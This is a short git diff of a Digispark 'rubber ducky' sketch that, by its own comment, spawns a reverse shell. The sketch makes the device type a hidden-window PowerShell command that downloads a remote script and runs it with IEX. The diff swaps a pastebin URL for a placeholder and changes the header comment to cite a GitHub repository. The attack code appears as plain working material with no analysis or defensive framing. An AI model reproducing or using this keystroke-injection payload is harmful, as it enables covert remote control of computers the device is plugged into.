@@ -1,4 +1,4 @@
-//A Digispark rubber ducky script for spawn a reverse shell in less than 3 seconds.
+// github.com/danieljlawson/digisparkreverseshell
 
 #include "DigiKeyboard.h"
 
@@ -34,7 +34,7 @@ void setup()
   DigiKeyboard.delay(300);
   
   //-->Fetches & executes Reverse Shell script
-  DigiKeyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/JPfHi2Mz');\""));
+  DigiKeyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('REMOTESCRIPTURL');\""));
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(150);
